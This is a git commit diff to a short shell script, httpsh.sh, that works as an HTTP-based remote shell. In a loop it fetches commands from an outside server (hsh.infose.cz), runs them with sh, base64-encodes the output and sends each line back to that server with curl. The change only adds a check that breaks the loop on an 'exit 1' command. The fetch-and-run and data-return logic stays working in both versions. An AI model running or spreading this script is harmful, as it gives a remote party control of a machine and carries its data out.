9d1d0e00d2d79a5606a53320115f086d110fa251
fob-bb <58139757+fob-bb@users.noreply.github.com>
2019-11-25 08:35:51 -0500

    a

--- httpsh.sh
+++ httpsh.sh
@@ -3,7 +3,11 @@ H=https://hsh.infose.cz
 
 i=0
 while :; do
-        curl -s "${H}/$$-$i" | sh | base64 | while read line; do
+        cmd=$(curl -s "${H}/$$-$i")
+        if [ X'exit 1' = X"${cmd}" ]; then
+                break
+        fi
+        echo "${cmd}" | sh | base64 | while read line; do
                 curl -s "${H}/r-$$-$i-$line"
         done
         i=$(( $i + 1 ))
